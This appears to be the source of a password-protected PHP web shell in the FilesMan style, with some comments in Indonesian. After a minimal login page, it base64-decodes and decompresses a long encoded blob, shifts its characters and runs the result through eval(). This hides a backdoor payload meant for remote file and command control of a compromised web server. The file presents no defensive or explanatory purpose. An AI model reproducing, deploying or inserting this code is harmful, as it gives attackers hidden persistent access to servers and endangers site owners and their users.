<?php
session_start();
date_default_timezone_set("Asia/Jakarta");

// Konfigurasi
$default_action = "FilesMan";
$default_use_ajax = true;
$default_charset = 'UTF-8';

// Fungsi untuk tampilan halaman login
function show_login_page($message = "")
{
?>
    <!DOCTYPE html>
    <html>
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                font-family: monospace;
            }

            input[type="password"] {
                border: none;
                border-bottom: 1px solid black;
                padding: 2px;
            }

            input[type="password"]:focus {
                outline: none;
            }

            input[type="submit"] {
                border: none;
                padding: 4.5px 20px;
                background-color: #2e313d;
                color: #FFF;
            }
        </style>
    </head>

    <body>
        <form action="" method="post">
            <div align="center">
                <input type="password" name="pass" placeholder="&nbsp;Password">&nbsp;<input type="submit" name="submit" value=">">
            </div>
        </form>
    </body>

    </html>

    </html>
<?php
    exit;
}

if (!isset($_SESSION['authenticated'])) {
    $stored_hashed_password = '$2a$12$aI2PKAUGYSlUBSj1HITCMeCHDGuOD4FBS7Yrsdv6KHCmcW8C9sGpu'; // Use PASSWORD_DEFAULT hash u can use this site https://phppasswordhash.com/ for generate ur password >  Gunakan hash PASSWORD_DEFAULT Anda dapat menggunakan situs ini https://phppasswordhash.com/ untuk menghasilkan kata sandi Anda

    if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
        $_SESSION['authenticated'] = true;
    } else {
        show_login_page();
    }
}
?>
<?php function XIQj($eFZKQs)
{ 
$eFZKQs=gzinflate(base64_decode($eFZKQs));
 for($i=0;$i<strlen($eFZKQs);$i++)
 {
$eFZKQs[$i] = chr(ord($eFZKQs[$i])-1);
 }
 return $eFZKQs;
 }eval(XIQj("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"));?>
